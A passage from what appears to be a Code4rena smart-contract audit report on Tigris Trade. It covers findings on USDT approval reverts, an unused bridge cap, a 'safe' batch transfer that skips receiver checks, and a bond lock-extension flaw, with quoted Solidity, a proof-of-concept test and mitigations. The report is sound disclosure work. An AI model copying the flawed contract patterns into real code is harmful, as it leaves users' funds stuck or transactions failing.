href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/162#issuecomment-1407489822\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174264\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174264</a>  </p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-trading-will-not-work-on-ethereum-if-usdt-is-used\" style=\"position:relative;\"><a href=\"#m-07-trading-will-not-work-on-ethereum-if-usdt-is-used\" aria-label=\"m 07 trading will not work on ethereum if usdt is used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/198\">[M-07] Trading will not work on Ethereum if USDT is used</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/198\">0xdeadbeef0x</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/673\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/670\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/669\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/456\">Faith</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/277\">mookimgo</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/241\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/237\">8olidity</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/62\">KingNFT</a></em></p>\n<p>Traders will not be able to:</p>\n<ol>\n<li>Initiate a market order</li>\n<li>Add margin</li>\n<li>Add to position</li>\n<li>initiate limit order</li>\n</ol>\n<p>If USDT is set as the margin asset and protocol is deployed on Ethereum.</p>\n<p>(Note: this issue was submitted after consulting with the sponsor even though currently there are no plans to deploy the platform on Ethereum).</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>USDT</code> has a race condition protection mechanism on ethereum chain:</p>\n<p>It does not allow users to change the allowance without first changing the allowance to 0.</p>\n<p><code>approve</code> function in <code>USDT</code> on Ethereum: <br><a href=\"https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L205\">https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L205</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // To change the approve amount you first have to reduce the addresses`</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //  allowance to zero by calling `approve(_spender, 0)` if it is not</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //  already 0 to mitigate the race condition described here:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(!((_value != 0) &amp;&amp; (allowed[msg.sender][_spender] != 0)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        allowed[msg.sender][_spender] = _value;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Approval(msg.sender, _spender, _value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>In <code>Trading</code>, if users use <code>USDT</code> as margin to:</p>\n<ol>\n<li>Initiate a market order</li>\n<li>Add margin</li>\n<li>Add to position</li>\n<li>initiate limit order</li>\n</ol>\n<p>The transaction will revert.</p>\n<p>This is due to the the <code>_handleDeposit</code> which is called in all of the above uses.</p>\n<p><code>_handleDeposit</code> calls the <code>USDT</code> margin asset <code>approve</code> function with <code>type(uint).max</code>.</p>\n<p>From the second time <code>approve</code> will be called, the transaction will revert.</p>\n<p><code>_handleDeposit</code> in <code>Trading</code>: <br><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">, ERC20PermitData calldata _permitData, address _trader) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IERC20(_marginAsset).approve(_stableVault, type(uint).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"tools-used-10\" style=\"position:relative;\"><a href=\"#tools-used-10\" aria-label=\"tools used 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>No need to to approve <code>USDT</code> every time.\nThe protocol could:</p>\n<ol>\n<li>Keep a record if allowance was already set on an address</li>\n<li>Create an external function that can be called by the owner to approve the a token address</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/198\">TriHaz (Tigris Trade) confirmed</a></strong>  </p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/198#issuecomment-1385223243\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>In contrast to unsafeERC20 functions (OOS), this report shows an issue with USDT or similar tokens that require a zero to non-zero allowance.</p>\n<p>Not resetting to zero and instead calling to set max multiple times will cause reverts in those cases.</p>\n<p>For this reason I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/198#issuecomment-1407500907\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174789\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174789</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-govnft-maxbridge-has-no-effect\" style=\"position:relative;\"><a href=\"#m-08-govnft-maxbridge-has-no-effect\" aria-label=\"m 08 govnft maxbridge has no effect permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/334\">[M-08] GovNFT: maxBridge has no effect</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/334\">cccz</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/675\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/385\">Madalad</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/289\">0xbepresent</a></em></p>\n<p>In GovNFT, setMaxBridge function is provided to set maxBridge, but this variable is not used, literally it should be used to limit the number of GovNFTs crossing chain, but it doesn’t work in GovNFT.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxBridge</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxBridge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_max</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maxBridge</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_max</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L311-L313\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L311-L313</a></p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider applying the maxBridge variable.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/334#issuecomment-1399552931\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, an unused variable, which was meant to cap the amount of tokens bridged per call, could cause a DOS.</p>\n<p>These types of DOS could only be fixed via Governance Operations, and could create further issues, for this reason I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/334#issuecomment-1407515433\">GainsGoblin (Tigris Trade) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175169\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175169</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-safetransfermany-doesnt-actually-use-safe-transfer\" style=\"position:relative;\"><a href=\"#m-09-safetransfermany-doesnt-actually-use-safe-transfer\" aria-label=\"m 09 safetransfermany doesnt actually use safe transfer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/356\">[M-09] <code>safeTransferMany()</code> doesn’t actually use safe transfer</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/356\">0xA5DF</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/412\">0xmuxyz</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/235\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/80\">0x4non</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/29\">HollaDieWaldfee</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285</a></p>\n<p>Both <code>BondNFT</code> and <code>GovNFT</code> are an ERC721 implementation, and they both also have a function named <code>safeTransferMany()</code> which its name implies is supposed to safe transfer many tokens at once.\nHowever the function doesn’t actually safe transfer.</p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Users might use this function, expecting it to verify that the receiver is an <code>ERC721Receiver</code>, but will get their funds stuck in a contract that doesn’t support ERC721.</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I’ve added the following tests to the <code>GovNFT</code> tests.</p>\n<p>1st test will succeed (tx will revert) since <code>safeTransferFrom()</code> does actually use safe transfer.</p>\n<p>2nd will fail (tx won’t revert), since <code>safeTransferMany()</code> doesn’t actually use a safe transfer.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/05.GovNFT.js b/test/05.GovNFT.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 711a649..d927320 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/05.GovNFT.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/05.GovNFT.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -98,6 +98,14 @@ describe(&quot;govnft&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    it(&quot;Safe transfer to non ERC721Receiver&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      expect(govnft.connect(owner)[&#39;safeTransferFrom(address,address,uint256)&#39;](owner.address,StableToken.address, 2)).to.be.revertedWith(&quot;ERC721: transfer to non ERC721Receiver implementer&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    it(&quot;Safe transfer many  to non ERC721Receiver&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith(&quot;ERC721: transfer to non ERC721Receiver implementer&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&quot;Transferring an NFT with pending delisted rewards should not affect pending rewards&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);</span></span></span></code></pre>\n<p>Output (I’ve shortened the output. following test will also fail, since the successful transfer will affect them):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">      ✔ Safe transfer to contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      1) Safe transfer many to contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  11 passing (3s)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  1 failing</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  1) govnft</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       Reward system related functions</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         Safe transfer many to contract:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      AssertionError: Expected transaction to be reverted</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      + expected - actual</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      -Transaction NOT reverted.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      +Transaction reverted.</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Call <code>_safeTransfer()</code> instead of <code>_transfer()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/356\">TriHaz (Tigris Trade) confirmed</a></strong>  </p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/356#issuecomment-1382257925\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a discrepancy between the intent of the code and the actual functionality when it comes to the <code>safeTransfer...</code> function.</p>\n<p>Because this finding is reliant on understanding the intention of the Sponsor, and in this case they have confirmed, I believe that the finding is valid and of Medium Severity, because the function was intended to be using the safe checks, but wasn’t.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/356#issuecomment-1407533514\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175381\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175381</a> </p>\n<p>We decided that we do not want transfers to check that the receiver is implementing IERC721Receiver, so we renamed the functions.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-bondnftextendlock-force-a-user-to-extend-the-bond-at-least-for-current-bondperiod\" style=\"position:relative;\"><a href=\"#m-10-bondnftextendlock-force-a-user-to-extend-the-bond-at-least-for-current-bondperiod\" aria-label=\"m 10 bondnftextendlock force a user to extend the bond at least for current bondperiod permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/359\">[M-10] <code>BondNFT.extendLock</code> force a user to extend the bond at least for current bond.period</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/359\">carlitox477</a></em></p>\n<p>The current implementation forces a user to extend their bonds for at least they current bond period. This means that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.</p>\n<p>If we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current <code>BondNFT.extendLock</code> function should be refactored.</p>\n<h3 id=\"impact-5\" 